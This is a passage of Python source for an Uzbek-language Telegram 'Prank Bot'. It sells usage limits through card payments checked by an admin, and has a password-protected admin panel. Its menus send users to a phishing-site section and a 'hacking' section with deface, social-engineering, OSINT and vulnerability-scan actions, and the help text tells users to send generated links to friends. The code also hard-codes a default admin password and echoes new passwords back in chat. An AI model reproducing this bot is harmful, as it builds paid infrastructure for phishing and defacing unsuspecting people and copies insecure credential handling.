    prices = await get_prices()
    package = prices.get(package_key)

    if not package:
        await query.edit_message_text("❌ Paket topilmadi.")
        return

    context.user_data[SELECTED_PACKAGE] = package_key

    text = (
        f"💳 <b>To'lov ma'lumotlari</b>\n\n"
        f"📦 Paket: <b>{package['name']}</b>\n"
        f"💰 Narxi: <b>{package['amount']:,} so'm</b>\n\n"
        f"📋 Karta raqami:\n"
        f"<code>{PAYMENT_CARD}</code>\n\n"
        f"👤 Karta egasi: <b>{CARD_HOLDER}</b>\n\n"
        f"✅ To'lov qilgandan so'ng, <b>chek rasmini</b> shu yerga yuboring!\n\n"
        f"⚠️ Eslatma: Admin tekshirgandan keyin limitlar qo'shiladi."
    )

    await query.edit_message_text(text, parse_mode='HTML')
    return WAITING_RECEIPT


async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle receipt photo from user."""
    user_id = update.effective_user.id
    package_key = context.user_data.get(SELECTED_PACKAGE)

    if not package_key:
        return

    prices = await get_prices()
    package = prices.get(package_key)
    if not package:
        return

    # Get the photo file ID
    if update.message.photo:
        file_id = update.message.photo[-1].file_id
    elif update.message.document:
        file_id = update.message.document.file_id
    else:
        await update.message.reply_text(
            "❌ Iltimos, chek <b>rasmini</b> yuboring!",
            parse_mode='HTML'
        )
        return

    # Save payment request
    payment_id = await create_payment(
        user_id, package['amount'], package['limits'], package['name'], file_id
    )

    await update.message.reply_text(
        f"✅ <b>To'lov so'rovi yuborildi!</b>\n\n"
        f"📦 Paket: {package['name']}\n"
        f"💰 Summa: {package['amount']:,} so'm\n"
        f"🆔 So'rov ID: #{payment_id}\n\n"
        f"⏳ Admin tekshirgandan keyin limitlar qo'shiladi.\n"
        f"Odatda 5-30 daqiqa ichida.",
        parse_mode='HTML'
    )

    # Notify admin
    user = update.effective_user
    admin_keyboard = [[
        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f'approve_{payment_id}'),
        InlineKeyboardButton("❌ Rad etish", callback_data=f'reject_{payment_id}'),
    ]]

    try:
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=file_id,
            caption=(
                f"💰 <b>Yangi to'lov so'rovi!</b>\n\n"
                f"🆔 So'rov: #{payment_id}\n"
                f"👤 Foydalanuvchi: {user.first_name} (@{user.username or 'yo\'q'})\n"
                f"🆔 User ID: <code>{user_id}</code>\n"
                f"📦 Paket: {package['name']}\n"
                f"💰 Summa: {package['amount']:,} so'm\n"
                f"📊 Limitlar: +{package['limits']} ta"
            ),
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(admin_keyboard)
        )
    except Exception as e:
        logger.error(f"Failed to notify admin: {e}")

    context.user_data.pop(SELECTED_PACKAGE, None)


# ============================================================
# ADMIN PAYMENT CALLBACKS
# ============================================================

async def approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle payment approval by admin."""
    query = update.callback_query
    
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔️ Faqat admin!", show_alert=True)
        return

    await query.answer()
    payment_id = int(query.data.replace('approve_', ''))
    
    user_id, limits = await approve_payment(payment_id, ADMIN_ID)
    
    if user_id:
        await query.edit_message_caption(
            caption=query.message.caption + f"\n\n✅ <b>TASDIQLANDI</b> — +{limits} limit",
            parse_mode='HTML'
        )
        
        try:
            remaining, total = await get_remaining_limits(user_id)
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"🎉 <b>To'lov tasdiqlandi!</b>\n\n"
                    f"✅ +{limits} ta limit qo'shildi!\n"
                    f"📊 Joriy limit: {remaining}/{total}\n\n"
                    f"Rahmat! Prank qilishni davom eting! 🎭"
                ),
                parse_mode='HTML'
            )
        except Exception:
            pass
    else:
        await query.edit_message_caption(
            caption=query.message.caption + "\n\n❌ Xatolik yuz berdi",
            parse_mode='HTML'
        )


async def reject_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle payment rejection by admin."""
    query = update.callback_query
    
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔️ Faqat admin!", show_alert=True)
        return

    await query.answer()
    payment_id = int(query.data.replace('reject_', ''))
    
    user_id = await reject_payment(payment_id, ADMIN_ID)
    
    if user_id:
        await query.edit_message_caption(
            caption=query.message.caption + "\n\n❌ <b>RAD ETILDI</b>",
            parse_mode='HTML'
        )
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"❌ <b>To'lov rad etildi</b>\n\n"
                    f"Sizning to'lov so'rovingiz rad etildi.\n"
                    f"Iltimos, to'g'ri chek yuborib qaytadan urinib ko'ring.\n\n"
                    f"❓ Muammo bo'lsa admin bilan bog'laning."
                ),
                parse_mode='HTML'
            )
        except Exception:
            pass


# ============================================================
# STATISTICS
# ============================================================

@check_banned
@check_required_subscription
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics."""
    user_id = update.effective_user.id
    remaining, total = await get_remaining_limits(user_id)
    referral_count = await get_referral_count(user_id)
    user = await get_user(user_id)

    ref_bonus = int(await get_setting('referral_bonus', str(REFERRAL_BONUS)))
    text = (
        f"📊 <b>Statistika</b>\n\n"
        f"📈 Kunlik limit: <b>{remaining}/{total}</b>\n"
        f"🎭 Pranklar yuborildi: <b>{user['total_pranks_sent']}</b>\n"
        f"🖼 Effektlar ishlatildi: <b>{user['total_effects_used']}</b>\n"
        f"🔗 Referallar: <b>{referral_count}</b> ta\n"
        f"🎁 Referaldan bonus: <b>{referral_count * ref_bonus}</b> ta limit"
    )


    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# HELP
# ============================================================

@check_banned
@check_required_subscription
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message."""
    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))
    text = (
        f"ℹ️ <b>Yordam</b>\n\n"
        f"🎭 <b>Prank yuborish</b>\n"
        f"Prank turini tanlang → Link oling → Do'stingizga yuboring!\n\n"
        f"🖼 <b>Rasm effektlari</b>\n"
        f"Effekt tanlang → Rasm yuboring → Effektli rasm oling!\n\n"
        f"🔗 <b>Referal tizimi</b>\n"
        f"Do'stlaringizni taklif qiling — har biri uchun +{ref_bonus} limit!\n\n"
        f"💰 <b>Limit sotib olish</b>\n"
        f"Karta orqali to'lang → Chek yuboring → Admin tasdiqlaydi!\n\n"
        f"📌 <b>Buyruqlar:</b>\n"
        f"/start — Botni boshlash\n"
        f"/help — Yordam\n"
        f"/profile — Profilim\n"
        f"/referral — Referal havola\n"
        f"/buy — Limit sotib olish\n"
        f"/admin — Admin panel\n"
    )

    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# ADMIN PANEL (CONVERSATION)
# ============================================================

async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - ask for password."""
    await update.message.reply_text("🔑 <b>Admin Panel</b>\n\nIltimos, parolni kiriting:", parse_mode='HTML')
    return ADMIN_PASSWORD

async def admin_password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check admin password."""
    password = update.message.text
    saved_pass = await get_setting('admin_password', 'shoxa2009')
    if password == saved_pass:
        await add_admin(update.effective_user.id)
        return await show_admin_main(update, context)
    else:
        await update.message.reply_text("❌ Parol noto'g'ri! Bekor qilindi.")
        return ConversationHandler.END

async def show_admin_main(update: Update, context: ContextTypes.DEFAULT_TYPE, is_callback=False):
    """Show the main admin menu."""
    stats = await get_total_stats()
    ref_bonus = await get_setting('referral_bonus', '3')
    daily_limit = await get_setting('daily_limit', '3')
    
    text = (
        f"👨‍💼 <b>Admin Panel</b>\n\n"
        f"👥 Foydalanuvchilar: {stats['total_users']}\n"
        f"💰 Daromad: {stats['total_revenue']:,} so'm\n\n"
        f"⚙️ <b>Sozlamalar:</b>\n"
        f"├ Referal bonus: {ref_bonus} ta\n"
        f"└ Kunlik limit: {daily_limit} ta\n\n"
        f"Quyidagilardan birini tanlang:"
    )

    keyboard = [
        [InlineKeyboardButton("📢 Xabar yuborish", callback_data='admin_broadcast')],
        [InlineKeyboardButton("⚙️ Bonusni o'zgartirish", callback_data='admin_set_ref'),
         InlineKeyboardButton("📈 Limitni o'zgartirish", callback_data='admin_set_daily')],
        [InlineKeyboardButton("🎁 Pro sovg'a qilish", callback_data='admin_gift_pro')],
        [InlineKeyboardButton("📢 Kanallar sozlamasi", callback_data='admin_channels')],
        [InlineKeyboardButton("💰 Narxlarni o'zgartirish", callback_data='admin_prices')],
        [InlineKeyboardButton("🚫 Bloklash", callback_data='admin_block'),
         InlineKeyboardButton("✅ Blokdan ochish", callback_data='admin_unblock')],
        [InlineKeyboardButton("📊 Statistika", callback_data='admin_stats')],
        [InlineKeyboardButton("🔑 Admin parolni o'zgartirish", callback_data='admin_change_pass')],
        [InlineKeyboardButton("❌ Chiqish", callback_data='admin_exit')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    if is_callback:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='HTML')
    return ADMIN_MAIN

async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle choices from the main admin menu."""
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'admin_broadcast':
        await query.edit_message_text("📢 Tarqatish uchun xabar yuboring. Rasm bilan yuborish mumkin. Link qo'shish uchun: 'Matn | https://example.com' formatida yozing.")
        return ADMIN_BROADCAST_MSG
    elif data == 'admin_set_ref':
        await query.edit_message_text("⚙️ Yangi referal bonus miqdorini kiriting:")
        return ADMIN_SET_REFERRAL
    elif data == 'admin_set_daily':
        await query.edit_message_text("📈 Yangi kunlik limit miqdorini kiriting:")
        return ADMIN_SET_DAILY
    elif data == 'admin_gift_pro':
        await query.edit_message_text("🎁 Foydalanuvchi ID yoki @username'ni kiriting:")
        return ADMIN_GIFT_USER
    elif data == 'admin_channels':
        keyboard = [
            [InlineKeyboardButton("➕ Qo'shish", callback_data='admin_add_channel'),
             InlineKeyboardButton("➖ O'chirish", callback_data='admin_remove_channel')],
            [InlineKeyboardButton("📜 Ro'yxat", callback_data='admin_list_channels')],
            [InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]
        ]
        await query.edit_message_text("📢 Majburiy obuna kanallarini boshqarish:", reply_markup=InlineKeyboardMarkup(keyboard))
        return ADMIN_MAIN
    elif data == 'admin_prices':
        await admin_prices_menu(update, context)
        return ADMIN_SELECT_PRICE
    elif data == 'admin_block':
        await query.edit_message_text("🚫 Bloklamoqchi bo'lgan user ID yoki @username'ni kiriting:")
        return ADMIN_BLOCK_USR
    elif data == 'admin_unblock':
        await query.edit_message_text("✅ Blokdan ochmoqchi bo'lgan user ID yoki @username'ni kiriting:")
        return ADMIN_UNBLOCK_USR
    elif data == 'admin_change_pass':
        await query.edit_message_text("🔑 Yangi admin parolni kiriting:")
        return ADMIN_CHANGE_ADM_PASS
    elif data == 'admin_add_channel':
        await query.edit_message_text("➕ Kanal username'sini kiriting (masalan @mychannel):")
        return ADMIN_ADD_CHANNEL
    elif data == 'admin_remove_channel':
        await query.edit_message_text("➖ O'chiriladigan kanal username'sini kiriting:")
        return ADMIN_REMOVE_CHANNEL
    elif data == 'admin_stats':
        stats = await get_total_stats()
        text = (
            f"📊 <b>Umumiy Statistika</b>\n\n"
            f"👥 Jami foydalanuvchilar: {stats['total_users']}\n"
            f"🚫 Bloklanganlar: {stats['banned_users']}\n"
            f"💰 Jami daromad: {stats['total_revenue']:,} so'm\n"
            f"🎭 Jami pranklar: {stats['total_pranks_sent']}\n"
            f"🖼 Jami effektlar: {stats['total_effects_used']}\n"
            f"🔗 Jami referallar: {stats['total_referrals']}\n"
            f"💳 Kutilayotgan to'lovlar: {stats['pending_payments']}"
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_back')]]))
        return ADMIN_MAIN
    elif data == 'admin_list_channels':
        channels = await get_required_channels()
        if not channels:
            text = "📢 Hozircha majburiy obuna kanallari yo'q."
        else:
            text = "📢 <b>Majburiy obuna kanallari:</b>\n\n"
            for i, ch in enumerate(channels, 1):
                text += f"{i}. {ch['channel_title']} (<code>{ch['channel_username']}</code>)\n"
        
        keyboard = [[InlineKeyboardButton("⬅️ Orqaga", callback_data='admin_channels')]]
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
        return ADMIN_MAIN
    elif data == 'admin_back':
        await show_admin_main(update, context, is_callback=True)
        return ADMIN_MAIN
    elif data == 'admin_exit':
        await query.edit_message_text("👋 Admin panel yopildi.")
        return ConversationHandler.END
    return ADMIN_MAIN

async def admin_set_ref_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text
    if not val.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_SET_REFERRAL
    await set_setting('referral_bonus', val)
    await update.message.reply_text(f"✅ Referal bonus {val} taga o'zgartirildi.")
    return await show_admin_main(update, context)

async def admin_set_daily_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text
    if not val.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_SET_DAILY
    await set_setting('daily_limit', val)
    await update.message.reply_text(f"✅ Kunlik limit {val} taga o'zgartirildi.")
    return await show_admin_main(update, context)

async def admin_gift_user_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    user = None
    if target.isdigit():
        user = await get_user(int(target))
    else:
        user = await get_user_by_username(target)
    
    if not user:
        await update.message.reply_text("❌ Foydalanuvchi topilmadi! Qaytadan urinib ko'ring yoki /cancel deb yozing.")
        return ADMIN_GIFT_USER
    
    context.user_data['gift_target_id'] = user['user_id']
    await update.message.reply_text(f"👤 Foydalanuvchi: {user['first_name']} (@{user['username'] or 'yo\'q'})\nNechta limit hadya qilmoqchisiz?")
    return ADMIN_GIFT_AMOUNT

async def admin_gift_amount_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text
    if not amount.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_GIFT_AMOUNT
    
    user_id = context.user_data.pop('gift_target_id', None)
    if user_id:
        await add_limits(user_id, int(amount))
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🎁 Admin sizga <b>{amount}</b> ta limit hadya qildi!\nPrank qilishdan to'xtamang! 😂",
                parse_mode='HTML'
            )
        except: pass
        await update.message.reply_text(f"✅ {amount} ta limit muvaffaqiyatli hadya qilindi.")
    
    return await show_admin_main(update, context)

async def admin_broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast message with optional image and link."""
    text = ""
    link = None
    photo_id = None
    
    if update.message.photo:
        photo_id = update.message.photo[-1].file_id
        text = update.message.caption or ""
    else:
        text = update.message.text or ""
    
    if " | " in text:
        spl = text.split(" | ", 1)
        text = spl[0]
        link = spl[1].strip()
    
    if not text and not photo_id:
        await update.message.reply_text("❌ Matn yoki rasm yuboring!")
        return ADMIN_BROADCAST_MSG
    
    users = await get_all_users()
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(f"📢 Yuborilmoqda... 0/{len(users)}")
    
    keyboard = None
    if link:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Batafsil", url=link)]])
    
    for uid in users:
        try:
            if photo_id:
                await context.bot.send_photo(chat_id=uid, photo=photo_id, caption=text, reply_markup=keyboard, parse_mode='HTML')
            else:
                await context.bot.send_message(chat_id=uid, text=text, reply_markup=keyboard, parse_mode='HTML')
            sent += 1
        except:
            failed += 1
        
        if (sent + failed) % 20 == 0:
            try: await status_msg.edit_text(f"📢 Yuborilmoqda... {sent + failed}/{len(users)}")
            except: pass
        await asyncio.sleep(0.05) # Avoid flood
    
    await status_msg.edit_text(f"✅ <b>Tugadi!</b>\n\n📤 Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')
    return await show_admin_main(update, context)

async def admin_add_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle adding a required channel."""
    channel_input = update.message.text.strip()
    if not channel_input:
        await update.message.reply_text("❌ Kanal username yoki ssilkasini kiriting!")
        return ADMIN_ADD_CHANNEL
    
    # Handle t.me links
    original_input = channel_input
    if 't.me/' in channel_input:
        channel_input = channel_input.split('t.me/')[-1].replace('+', '')
        if '/' in channel_input: # Handle cases like t.me/c/12345/678
            channel_input = channel_input.split('/')[0]
        
        # If it was an invite link (had + or /joinchat/), we might have issues checking status
        # But let's try to normalize to @username if possible
        if not original_input.startswith('https://t.me/+') and not '/joinchat/' in original_input:
            channel_input = '@' + channel_input
        else:
            # It's an invite link
            channel_input = original_input
    
    if not channel_input.startswith('@') and not channel_input.startswith('https://'):
        channel_input = '@' + channel_input
    
    # Try to get channel info
    try:
        chat = await context.bot.get_chat(channel_input)
        channel_title = chat.title or channel_input
    except Exception as e:
        logger.error(f"Error getting chat {channel_input}: {e}")
        channel_title = channel_input
    
    success = await add_required_channel(channel_input, channel_title)
    if success:
        await update.message.reply_text(
            f"✅ <b>{channel_title}</b> ({channel_input}) majburiy obunaga qo'shildi!\n\n"
            f"⚠️ Bot bu kanalda <b>Admin</b> bo'lishi shart!",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"⚠️ Bu kanal allaqachon ro'yxatda mavjud!",
            parse_mode='HTML'
        )
    return await show_admin_main(update, context)


async def admin_change_adm_pass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_pass = update.message.text.strip()
    if len(new_pass) < 4:
        await update.message.reply_text("❌ Parol juda qisqa (min 4 ta belgi)!")
        return ADMIN_CHANGE_ADM_PASS
    await set_setting('admin_password', new_pass)
    await update.message.reply_text(f"✅ Admin parol muvaffaqiyatli '{new_pass}' ga o'zgartirildi.")
    return await show_admin_main(update, context)

async def admin_block_usr_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    await block_user(target)
    await update.message.reply_text(f"🚫 {target} bloklandi.")
    return await show_admin_main(update, context)

async def admin_unblock_usr_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    await unblock_user(target)
    await update.message.reply_text(f"✅ {target} blokdan ochildi.")
    return await show_admin_main(update, context)

async def admin_prices_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prices = await get_prices()
    keyboard = []
    for key, info in prices.items():
        keyboard.append([InlineKeyboardButton(f"{info['name']} - {info['amount']:,} so'm", callback_data=f"setp_{key}")])
    keyboard.append([InlineKeyboardButton("⬅️ Orqaga", callback_data="admin_back")])
    text = "💰 <b>Narxlarni o'zgartirish</b>\n\nQaysi paket narxini o'zgartirmoqchisiz?"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def admin_select_price_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'admin_back':
        return await show_admin_main(update, context, is_callback=True)
    
    pkg_key = query.data.replace("setp_", "")
    context.user_data['editing_pkg'] = pkg_key
    await query.edit_message_text(f"💵 '{pkg_key}' paketi uchun yangi narxni kiriting (so'mda):")
    return ADMIN_ENTER_NEW_PRICE

async def admin_set_price_value_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_price = update.message.text.strip()
    if not new_price.isdigit():
        await update.message.reply_text("❌ Faqat son kiriting!")
        return ADMIN_ENTER_NEW_PRICE
    
    pkg_key = context.user_data.pop('editing_pkg', None)
    if pkg_key:
        prices = await get_prices()
        if pkg_key in prices:
            prices[pkg_key]['amount'] = int(new_price)
            await set_setting('prices', json.dumps(prices))
            await update.message.reply_text(f"✅ '{pkg_key}' paketi narxi {int(new_price):,} so'mga o'zgartirildi.")
    
    return await show_admin_main(update, context)

async def admin_remove_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle removing a required channel."""
    channel_input = update.message.text.strip()
    if not channel_input:
        await update.message.reply_text("❌ Kanal username sini kiriting!")
        return ADMIN_REMOVE_CHANNEL
    
    success = await remove_required_channel(channel_input)
    if success:
        await update.message.reply_text(
            f"✅ <b>{channel_input}</b> majburiy obunadan o'chirildi!",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"❌ Bu kanal topilmadi!",
            parse_mode='HTML'
        )
    return await show_admin_main(update, context)


async def cancel_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Bekor qilindi.")
    return ConversationHandler.END

@check_banned
@check_required_subscription
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages including button presses."""
    text = update.message.text

    # Handle menu button presses — clear any active hacker action first
    menu_buttons = [
        "🎭 Prank yuborish", "🌐 Phishing sayt", "🛡 Hackerlik bo'limi",
        "🖼 Rasm effektlari", "👤 Profilim", "🔗 Referal",
        "💰 Limit sotib olish", "📊 Statistika", "ℹ️ Yordam"
    ]
    if text in menu_buttons:
        context.user_data.pop('hacker_action', None)

    if text == "🎭 Prank yuborish":
        await prank_menu(update, context)
    elif text == "🌐 Phishing sayt":
        await phishing_menu(update, context)
    elif text == "🛡 Hackerlik bo'limi":
        await hacker_menu(update, context)
    elif text == "🖼 Rasm effektlari":
        await effects_menu(update, context)
    elif text == "👤 Profilim":
        await profile_command(update, context)
    elif text == "🔗 Referal":
        await referral_command(update, context)
    elif text == "💰 Limit sotib olish":
        await buy_limits_menu(update, context)
    elif text == "📊 Statistika":
        await stats_command(update, context)
    elif text == "ℹ️ Yordam":
        await help_command(update, context)
    else:
        # Check if user is in a hacker tool action state
        action = context.user_data.get('hacker_action')
        if action:
            if action == 'osint':
                await osint_handler(update, context)
                return
            elif action == 'terminal':
                await terminal_handler(update, context)
                return
            elif action == 'vuln_scan':
                await vuln_scan_handler(update, context)
                return
            elif action == 'gpt':
                await gpt_handler(update, context)
                return
            elif action == 'deface':
                await deface_handler(update, context)
                return
            elif action == 'se':
                await se_handler(update, context)
                return
            elif action == 'voice':
                await voice_handler(update, context)
                return
            elif action == 'exif':
                await exif_handler(update, context)
                return

        # Check if user has a selected package (might be sending receipt as document)
        if context.user_data.get(SELECTED_PACKAGE):
            await update.message.reply_text(
                "📸 Iltimos, to'lov <b>chekini rasm</b> sifatida yuboring!",
                parse_mode='HTML'
            )



@check_banned
@check_required_subscription
async def handle_document_or_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document or photo messages."""
    user_id = update.effective_user.id
    
    # Check if document is an image
    is_image_doc = False
    if update.message.document:
        mime = update.message.document.mime_type
        if mime and mime.startswith('image/'):
            is_image_doc = True

    # If user has selected a package, treat as receipt
    if context.user_data.get(SELECTED_PACKAGE):
        await handle_receipt(update, context)
        return
    
    # Check for hacker action (e.g. EXIF remover)
    action = context.user_data.get('hacker_action')
    if action == 'exif' and (update.message.photo or is_image_doc):
        await exif_handler(update, context)
        return

    # If it's a photo or an image document
    if update.message.photo or is_image_doc:
        # If user has selected an effect
        if context.user_data.get(SELECTED_EFFECT):
            await handle_photo(update, context)
        else:
            # Default: treat as effect request
            await handle_photo(update, context)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a telegram message to notify the developer."""
    # Ignore Conflict errors (duplicate bot instances) - don't spam admin
    from telegram.error import Conflict
    if isinstance(context.error, Conflict):
        logger.warning("Conflict error — ikki bot nusxasi ishlayapti. Eski jarayonni to'xtating!")
        return
    
    logger.error("Exception while handling an update:", exc_info=context.error)
    try:
        tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
        tb_string = "".join(tb_list)
        update_str = json.dumps(update.to_dict(), indent=2, ensure_ascii=False) if hasattr(update, 'to_dict') else str(update)
        message = (
            f"⚠️ <b>Botda xatolik yuz berdi!</b>\n\n"
            f"<b>Xatolik:</b>\n<pre>{html.escape(tb_string)[-3500:]}</pre>"
        )
        if ADMIN_ID:
            await context.bot.send_message(chat_id=int(ADMIN_ID), text=message, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to send error message: {e}")



# ============================================================
# MAIN
# ============================================================

async def post_init(app: Application):
    """Post-initialization hook."""
    try:
        await init_db()
        # Set bot app for web server notifications
        set_bot_app(app)
        # Start web server in the background
        asyncio.create_task(start_web_server())
        logger.info("✅ Database and Web Server initialized")
    except Exception as e:
        logger.error(f"Error in post_init: {e}")


def main():
    """Start the bot."""
    if not BOT_TOKEN or BOT_TOKEN == 'your_bot_token_here':
        print("❌ BOT_TOKEN ni .env faylida sozlang!")
        print("📋 .env.example faylini .env ga nusxalab, sozlamalarni kiriting.")
        return

    print("🤖 Prank Bot ishga tushmoqda...")

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_error_handler(error_handler)

    # Admin Conversation
    admin_handler = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_start)],
        states={
            ADMIN_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_password_handler)],
            ADMIN_MAIN: [CallbackQueryHandler(admin_menu_callback)],
            ADMIN_SET_REFERRAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_ref_handler)],
            ADMIN_SET_DAILY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_daily_handler)],
            ADMIN_GIFT_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_gift_user_handler)],
            ADMIN_GIFT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_gift_amount_handler)],
            ADMIN_BROADCAST_MSG: [
                MessageHandler(filters.TEXT | filters.PHOTO | filters.CAPTION, admin_broadcast_handler)
            ],
            ADMIN_ADD_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_channel_handler)],
            ADMIN_REMOVE_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_remove_channel_handler)],
            ADMIN_CHANGE_ADM_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_change_adm_pass_handler)],
            ADMIN_BLOCK_USR: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_block_usr_handler)],
            ADMIN_UNBLOCK_USR: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_unblock_usr_handler)],
            ADMIN_SELECT_PRICE: [CallbackQueryHandler(admin_select_price_callback)],
            ADMIN_ENTER_NEW_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_price_value_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel_admin)]
    )
    app.add_handler(admin_handler)

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("profile", profile_command))
    app.add_handler(CommandHandler("referral", referral_command))
    app.add_handler(CommandHandler("buy", buy_limits_menu))

    # Legacy Admin commands (Optional: keep for quick access if already authenticated, 
    # but ConversationHandler is safer. Removing for simplicity as requested per panel.)
    # app.add_handler(CommandHandler("pending", pending_payments)) 

    # Callback query handlers
    app.add_handler(CallbackQueryHandler(check_sub_callback, pattern=r'^check_sub$'))
    app.add_handler(CallbackQueryHandler(prank_callback, pattern=r'^prank_'))
    app.add_handler(CallbackQueryHandler(phishing_callback, pattern=r'^phish_'))
    app.add_handler(CallbackQueryHandler(hacker_back_callback, pattern=r'^hacker_back$'))
    app.add_handler(CallbackQueryHandler(hacker_callback, pattern=r'^hacker_'))
    app.add_handler(CallbackQueryHandler(effect_callback, pattern=r'^effect_'))
    app.add_handler(CallbackQueryHandler(buy_callback, pattern=r'^buy_'))
    app.add_handler(CallbackQueryHandler(approve_callback, pattern=r'^approve_'))
    app.add_handler(CallbackQueryHandler(reject_callback, pattern=r'^reject_'))

    # Message handlers
    app.add_handler(MessageHandler(filters.PHOTO, handle_document_or_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document_or_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    print("✅ Bot tayyor! Ishga tushirilmoqda...")
    app.run_polling(drop_pending_updates=True)


if __name__ == '__main__':
    main()

